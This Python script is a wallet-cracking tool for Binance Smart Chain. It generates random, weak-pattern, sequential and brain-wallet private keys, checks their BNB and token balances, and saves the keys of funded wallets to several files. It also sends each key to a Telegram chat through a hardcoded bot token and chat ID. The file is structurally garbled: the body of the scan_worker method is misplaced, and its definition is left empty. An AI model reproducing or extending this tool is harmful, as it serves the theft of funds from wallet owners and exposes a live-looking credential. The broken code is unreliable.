import asyncio
import aiohttp
import json
import time
import secrets
from web3 import Web3
from concurrent.futures import ThreadPoolExecutor
import multiprocessing as mp
from datetime import datetime
import logging
import random
from typing import List, Dict, Tuple

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class OptimizedWalletScanner:
    def __init__(self):
        self.rpc_endpoints = [
            'https://bsc-dataseed.binance.org/',
            'https://bsc-dataseed1.binance.org/',
            'https://bsc-dataseed2.binance.org/',
            'https://bsc-dataseed3.binance.org/',
        ]
        
        # Token contracts and decimals
        self.token_contracts = {
            'USDT': ('0x55d398326f99059fF775485246999027B3197955', 18),
            'BTCB': ('0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c', 18),
            'XRP': ('0x1D2F0da169ceB9fC7B3144628dB156f3F6c60dBE', 18),
            'TRX': ('0xCE7de646e7208a4Ef112cb6ed5038FA6cC6b12e3', 6),
            'TON': ('0x76A797A59Ba2C17726896976B7B3747BfD1d220f', 9)
        }
        
        # Batch RPC call template
        self.batch_rpc_template = {
            "jsonrpc": "2.0",
            "method": "eth_getBalance",
            "params": [],
            "id": 0
        }

    def generate_random_private_key(self) -> str:
        """Generate a cryptographically secure random private key"""
        return secrets.token_hex(32)

    def generate_targeted_private_keys(self, count: int) -> List[str]:
        """Generate private keys using different strategies"""
        keys = []
        
        # Strategy 1: Pure random (most realistic)
        for _ in range(count // 4):
            keys.append(self.generate_random_private_key())
        
        # Strategy 2: Keys with patterns (brain wallets, weak entropy)
        patterns = [
            "0" * 60,  # Weak keys with many zeros
            "1" * 60,  # Weak keys with many ones
            "f" * 60,  # Weak keys with many f's
        ]
        
        for pattern in patterns:
            for i in range(count // 12):
                # Add some randomness to pattern
                key = pattern + secrets.token_hex(2)
                keys.append(key)
        
        # Strategy 3: Sequential from random start points
        for _ in range(count // 4):
            start = secrets.randbelow(2**256)
            keys.append(f"{start:064x}")
        
        # Strategy 4: Keys derived from common phrases/words (brain wallets)
        common_phrases = [
            "password123", "bitcoin", "ethereum", "wallet", "crypto",
            "blockchain", "satoshi", "money", "rich", "lambo"
        ]
        
        for phrase in common_phrases[:count // 20]:
            # Simple hash of phrase (this is how brain wallets work)
            import hashlib
            key_hash = hashlib.sha256(phrase.encode()).hexdigest()
            keys.append(key_hash)
        
        return keys[:count]

    async def batch_check_balances(self, addresses: List[str], session: aiohttp.ClientSession, rpc_url: str) -> Dict[str, float]:
        """Check multiple addresses in a single batch RPC call"""
        batch_requests = []
        
        for i, address in enumerate(addresses):
            request = {
                "jsonrpc": "2.0",
                "method": "eth_getBalance",
                "params": [address, "latest"],
                "id": i
            }
            batch_requests.append(request)
        
        try:
            async with session.post(rpc_url, json=batch_requests, timeout=30) as response:
                results = await response.json()
                
                balances = {}
                for result in results:
                    if 'result' in result and result['result']:
                        address = addresses[result['id']]
                        balance_wei = int(result['result'], 16)
                        balance_bnb = balance_wei / 10**18
                        balances[address] = balance_bnb
                
                return balances
                
        except Exception as e:
            logger.warning(f"Batch balance check failed: {e}")
            return {}

    async def check_single_balance(self, address: str, session: aiohttp.ClientSession, rpc_url: str) -> float:
        """Check single address balance"""
        payload = {
            "jsonrpc": "2.0",
            "method": "eth_getBalance",
            "params": [address, "latest"],
            "id": 1
        }
        
        try:
            async with session.post(rpc_url, json=payload, timeout=10) as response:
                result = await response.json()
                if 'result' in result and result['result']:
                    balance_wei = int(result['result'], 16)
                    return balance_wei / 10**18
        except Exception as e:
            logger.debug(f"Balance check failed for {address}: {e}")
        
        return 0.0

    async def scan_batch_async(self, private_keys: List[str], rpc_url: str) -> List[Dict]:
        """Asynchronously scan a batch of private keys"""
        found_wallets = []
        
        async with aiohttp.ClientSession() as session:
            # Convert private keys to addresses
            addresses = []
            key_to_address = {}
            
            for private_key in private_keys:
                try:
                    if not private_key.startswith('0x'):
                        private_key = '0x' + private_key
                    
                    account = Web3().eth.account.from_key(private_key)
                    address = account.address
                    addresses.append(address)
                    key_to_address[address] = private_key
                except:
                    continue
            
            # Batch check balances
            balances = await self.batch_check_balances(addresses, session, rpc_url)
            
            # Process results
            for address, balance in balances.items():
                if balance > 0:  # Only save wallets with balance > 0
                    private_key = key_to_address[address]
                    
                    # Get additional token balances for wallets with BNB
                    token_balances = await self.check_token_balances(address, session, rpc_url)
                    
                    wallet_data = {
                        'private_key': private_key.replace('0x', ''),  # Clean format
                        'address': address,
                        'bnb_balance': balance,
                        'token_balances': token_balances,
                        'total_value_usd': self.estimate_total_value(balance, token_balances),
                        'found_at': datetime.now().isoformat(),
                        'bscscan_url': f'https://bscscan.com/address/{address}'
                    }
                    found_wallets.append(wallet_data)
                    
                    # Immediately save to file when found
                    self.save_wallet_immediately(wallet_data)
                    
                    logger.info(f"🎉 FOUND WALLET: {address} with {balance:.8f} BNB")
        
        return found_wallets

    async def check_token_balances(self, address: str, session: aiohttp.ClientSession, rpc_url: str) -> Dict[str, float]:
        """Check token balances for an address"""
        token_balances = {}
        
        # ERC-20 balanceOf function signature
        balance_of_sig = "0x70a08231"  # balanceOf(address)
        
        for token_name, (contract_address, decimals) in self.token_contracts.items():
            try:
                # Encode the address parameter (remove 0x and pad to 64 chars)
                address_param = address[2:].lower().zfill(64)
                data = balance_of_sig + address_param
                
                payload = {
                    "jsonrpc": "2.0",
                    "method": "eth_call",
                    "params": [{
                        "to": contract_address,
                        "data": data
                    }, "latest"],
                    "id": 1
                }
                
                async with session.post(rpc_url, json=payload, timeout=10) as response:
                    result = await response.json()
                    
                    if 'result' in result and result['result'] != '0x':
                        balance_hex = result['result']
                        balance_int = int(balance_hex, 16)
                        balance_readable = balance_int / (10 ** decimals)
                        
                        if balance_readable > 0:
                            token_balances[token_name] = balance_readable
                            
            except Exception as e:
                logger.debug(f"Failed to check {token_name} balance: {e}")
                
        return token_balances

    def estimate_total_value(self, bnb_balance: float, token_balances: Dict[str, float]) -> float:
        """Estimate total value in USD (rough approximation)"""
        # Rough price estimates (you should update these or use a price API)
        prices = {
            'BNB': 300,    # $300 per BNB
            'USDT': 1,     # $1 per USDT
            'BTCB': 45000, # $45000 per BTC
            'XRP': 0.5,    # $0.5 per XRP
            'TRX': 0.1,    # $0.1 per TRX
            'TON': 2.5     # $2.5 per TON
        }
        
        total_value = bnb_balance * prices.get('BNB', 300)
        
        for token, balance in token_balances.items():
            token_price = prices.get(token, 0)
            total_value += balance * token_price
            
        return total_value

    def save_wallet_immediately(self, wallet_data: Dict):
        """Save wallet data immediately when found"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        
        # 1. Save to main JSON file (append)
        try:
            # Read existing data
            try:
                with open('found_wallets.json', 'r') as f:
                    existing_wallets = json.load(f)
            except (FileNotFoundError, json.JSONDecodeError):
                existing_wallets = []
            
            # Add new wallet
            existing_wallets.append(wallet_data)
            
            # Save back to file
            with open('found_wallets.json', 'w') as f:
                json.dump(existing_wallets, f, indent=2)
                
        except Exception as e:
            logger.error(f"Failed to save to JSON: {e}")
        
        # 2. Save to backup text file (human readable)
        try:
            with open('found_wallets_backup.txt', 'a', encoding='utf-8') as f:
                f.write(f"\n{'='*60}\n")
                f.write(f"WALLET FOUND: {timestamp}\n")
                f.write(f"{'='*60}\n")
                f.write(f"Address: {wallet_data['address']}\n")
                f.write(f"Private Key: {wallet_data['private_key']}\n")
                f.write(f"BNB Balance: {wallet_data['bnb_balance']:.8f}\n")
                
                if wallet_data.get('token_balances'):
                    f.write(f"Token Balances:\n")
                    for token, balance in wallet_data['token_balances'].items():
                        f.write(f"  {token}: {balance:.8f}\n")
                
                f.write(f"Estimated Value: ${wallet_data.get('total_value_usd', 0):.2f}\n")
                f.write(f"BSC Scan: {wallet_data['bscscan_url']}\n")
                f.write(f"Found At: {wallet_data['found_at']}\n")
                f.write(f"{'='*60}\n")
                
        except Exception as e:
            logger.error(f"Failed to save to backup file: {e}")
        
        # 3. Save individual wallet file (for security)
        try:
            wallet_filename = f"wallet_{wallet_data['address'][:10]}_{timestamp}.json"
            with open(wallet_filename, 'w') as f:
                json.dump(wallet_data, f, indent=2)
                
        except Exception as e:
            logger.error(f"Failed to save individual wallet file: {e}")
        
        # 4. Save to CSV for Excel compatibility
        try:
            import csv
            csv_exists = False
            try:
                with open('found_wallets.csv', 'r'):
                    csv_exists = True
            except FileNotFoundError:
                pass
            
            with open('found_wallets.csv', 'a', newline='', encoding='utf-8') as f:
                writer = csv.writer(f)
                
                # Write header if file is new
                if not csv_exists:
                    writer.writerow([
                        'Address', 'Private_Key', 'BNB_Balance', 'Token_Balances', 
                        'Total_Value_USD', 'Found_At', 'BSC_Scan_URL'
                    ])
                
                # Format token balances as string
                token_str = json.dumps(wallet_data.get('token_balances', {}))
                
                writer.writerow([
                    wallet_data['address'],
                    wallet_data['private_key'],
                    wallet_data['bnb_balance'],
                    token_str,
                    wallet_data.get('total_value_usd', 0),
                    wallet_data['found_at'],
                    wallet_data['bscscan_url']
                ])
                
        except Exception as e:
            logger.error(f"Failed to save to CSV: {e}")
        
        logger.info(f"💾 Wallet saved to multiple files: {wallet_data['address']}")
        """Worker function for multiprocessing"""
        found_wallets = []
        rpc_url = self.rpc_endpoints[worker_id % len(self.rpc_endpoints)]
        
        logger.info(f"Worker {worker_id} started with RPC: {rpc_url}")
        
        for batch_num in range(total_batches):
            # Generate batch of private keys
            private_keys = self.generate_targeted_private_keys(keys_per_batch)
            
            # Run async scan
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            
            try:
                batch_results = loop.run_until_complete(
                    self.scan_batch_async(private_keys, rpc_url)
                )
                
                # Send Telegram notifications for found wallets
                for wallet in batch_results:
                    self.send_telegram_notification(wallet)
                
                found_wallets.extend(batch_results)
                
                if batch_num % 10 == 0:
                    logger.info(f"Worker {worker_id}: Completed batch {batch_num}/{total_batches}")
                    
            except Exception as e:
                logger.error(f"Worker {worker_id} batch {batch_num} failed: {e}")
            finally:
                loop.close()
            
            # Small delay to avoid overwhelming RPC
            time.sleep(0.1)
        
        logger.info(f"Worker {worker_id} completed. Found {len(found_wallets)} wallets.")
        return found_wallets

    def run_parallel_scan(self, num_workers: int = None, keys_per_batch: int = 100, batches_per_worker: int = 100):
        """Run parallel wallet scanning"""
        if num_workers is None:
            num_workers = min(8, mp.cpu_count())
        
        logger.info(f"Starting parallel scan with {num_workers} workers")
        logger.info(f"Each worker will process {batches_per_worker} batches of {keys_per_batch} keys")
        logger.info(f"Total keys to check: {num_workers * batches_per_worker * keys_per_batch:,}")
        
        start_time = time.time()
        
        # Create worker processes
        with mp.Pool(processes=num_workers) as pool:
            # Start all workers
            worker_args = [
                (worker_id, keys_per_batch, batches_per_worker) 
                for worker_id in range(num_workers)
            ]
            
            results = pool.starmap(self.scan_worker, worker_args)
        
        # Collect all results
        all_found_wallets = []
        for worker_results in results:
            all_found_wallets.extend(worker_results)
        
        elapsed_time = time.time() - start_time
        total_keys = num_workers * batches_per_worker * keys_per_batch
        rate = total_keys / elapsed_time
        
        logger.info(f"Scan completed in {elapsed_time:.2f} seconds")
        logger.info(f"Rate: {rate:.2f} keys/second")
        logger.info(f"Found {len(all_found_wallets)} wallets with balance")
        
        # Save results (final summary)
        if all_found_wallets:
            self.save_final_summary(all_found_wallets)
            logger.info("Final summary saved to files")
        
        return all_found_wallets

    def save_final_summary(self, wallets: List[Dict]):
        """Save final summary of all found wallets"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        
        # Summary statistics
        total_bnb = sum(w['bnb_balance'] for w in wallets)
        total_value = sum(w.get('total_value_usd', 0) for w in wallets)
        
        summary = {
            'scan_completed': timestamp,
            'total_wallets_found': len(wallets),
            'total_bnb_balance': total_bnb,
            'total_estimated_value_usd': total_value,
            'wallets': wallets
        }
        
        # Save comprehensive summary
        with open(f'scan_summary_{timestamp}.json', 'w') as f:
            json.dump(summary, f, indent=2)
        
        # Save simple list for import
        simple_list = []
        for wallet in wallets:
            simple_list.append({
                'address': wallet['address'],
                'private_key': wallet['private_key'],
                'bnb_balance': wallet['bnb_balance']
            })
        
        with open(f'simple_wallets_{timestamp}.json', 'w') as f:
            json.dump(simple_list, f, indent=2)
        
        logger.info(f"📊 Summary: {len(wallets)} wallets, {total_bnb:.8f} BNB, ~${total_value:.2f}")

    def send_telegram_notification(self, wallet_data: Dict):
        """Send Telegram notification when wallet is found"""
        try:
            # Your Telegram credentials
            TELEGRAM_BOT_TOKEN = '7623118497:AAGIOQGynrEPcM7pKBw4Ryu14eN5-aZvVWE'
            TELEGRAM_CHAT_ID = '491029985'
            
            message = f"🎉 <b>WALLET FOUND!</b>\n\n"
            message += f"💰 <b>Address:</b> <code>{wallet_data['address']}</code>\n"
            message += f"🔑 <b>Private Key:</b> <code>{wallet_data['private_key']}</code>\n"
            message += f"💎 <b>BNB Balance:</b> {wallet_data['bnb_balance']:.8f}\n"
            
            if wallet_data.get('token_balances'):
                message += f"\n🪙 <b>Token Balances:</b>\n"
                for token, balance in wallet_data['token_balances'].items():
                    message += f"• {token}: {balance:.8f}\n"
            
            message += f"\n💵 <b>Est. Value:</b> ${wallet_data.get('total_value_usd', 0):.2f}\n"
            message += f"🔍 <b>BSCScan:</b> {wallet_data['bscscan_url']}\n"
            message += f"⏰ <b>Found:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            
            import requests
            url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
            payload = {
                'chat_id': TELEGRAM_CHAT_ID,
                'text': message,
                'parse_mode': 'HTML'
            }
            
            response = requests.post(url, data=payload, timeout=30)
            if response.status_code == 200:
                logger.info("✅ Telegram notification sent successfully")
            else:
                logger.warning(f"❌ Telegram notification failed: {response.status_code}")
                
        except Exception as e:
            logger.error(f"❌ Failed to send Telegram notification: {e}")

    def scan_worker(self, worker_id: int, keys_per_batch: int, total_batches: int) -> List[Dict]:

# Additional optimization strategies
class AdvancedStrategies:
    """Advanced strategies for wallet discovery"""
    
    @staticmethod
    def generate_brain_wallet_keys(phrases: List[str]) -> List[str]:
        """Generate keys from common phrases (brain wallets)"""
        import hashlib
        keys = []
        
        for phrase in phrases:
            # SHA256 of phrase
            key1 = hashlib.sha256(phrase.encode()).hexdigest()
            keys.append(key1)
            
            # SHA256 of phrase + salt
            for salt in ['', '1', '123', 'password', 'wallet']:
                salted = phrase + salt
                key2 = hashlib.sha256(salted.encode()).hexdigest()
                keys.append(key2)
        
        return keys
    
    @staticmethod
    def generate_weak_entropy_keys(count: int) -> List[str]:
        """Generate keys that might come from weak random number generators"""
        keys = []
        
        # Keys with low entropy (many repeated bytes)
        for pattern in ['00', '11', 'ff', 'aa']:
            for length in [8, 16, 32]:
                key = pattern * length
                if len(key) == 64:
                    keys.append(key)
        
        # Keys from predictable sequences
        for start in range(1, count // 10):
            key = f"{start:064x}"
            keys.append(key)
        
        return keys[:count]

# Usage example with enhanced file saving
def main():
    scanner = OptimizedWalletScanner()
    
    # Configuration
    NUM_WORKERS = 4  # Adjust based on your CPU cores
    KEYS_PER_BATCH = 50  # Smaller batches for better RPC handling
    BATCHES_PER_WORKER = 100  # Adjust based on how long you want to run
    
    print("🚀 Starting Optimized Wallet Scanner...")
    print(f"👥 Workers: {NUM_WORKERS}")
    print(f"📦 Keys per batch: {KEYS_PER_BATCH}")
    print(f"🔄 Batches per worker: {BATCHES_PER_WORKER}")
    print(f"🎯 Total keys to scan: {NUM_WORKERS * KEYS_PER_BATCH * BATCHES_PER_WORKER:,}")
    print("💾 Found wallets will be saved to multiple file formats...")
    print("📱 Telegram notifications enabled...")
    print("-" * 60)
    
    try:
        found_wallets = scanner.run_parallel_scan(
            num_workers=NUM_WORKERS,
            keys_per_batch=KEYS_PER_BATCH,
            batches_per_worker=BATCHES_PER_WORKER
        )
        
        if found_wallets:
            print(f"\n🎉 SUCCESS! Found {len(found_wallets)} wallets with balance!")
            print("\n📁 Files created:")
            print("  • found_wallets.json (main file)")
            print("  • found_wallets_backup.txt (human readable)")
            print("  • found_wallets.csv (Excel compatible)")
            print("  • wallet_[address]_[timestamp].json (individual files)")
            print("  • scan_summary_[timestamp].json (final summary)")
            
            print(f"\n💰 Summary:")
            total_bnb = sum(w['bnb_balance'] for w in found_wallets)
            total_value = sum(w.get('total_value_usd', 0) for w in found_wallets)
            print(f"  • Total BNB: {total_bnb:.8f}")
            print(f"  • Estimated Value: ${total_value:.2f}")
            
            print(f"\n🔍 Found Wallets:")
            for i, wallet in enumerate(found_wallets, 1):
                print(f"{i}. {wallet['address']} - {wallet['bnb_balance']:.8f} BNB")
                if wallet.get('token_balances'):
                    for token, balance in wallet['token_balances'].items():
                        print(f"   + {token}: {balance:.8f}")
                        
        else:
            print("\n😔 No wallets with balance found in this scan.")
            print("💡 Try running again or adjusting the search strategies.")
            
    except KeyboardInterrupt:
        print("\n⏹️ Scan interrupted by user.")
        print("💾 Any found wallets have been saved to files.")
    except Exception as e:
        print(f"\n❌ Error during scan: {e}")
        print("💾 Check log files for details.")

if __name__ == "__main__":
    main()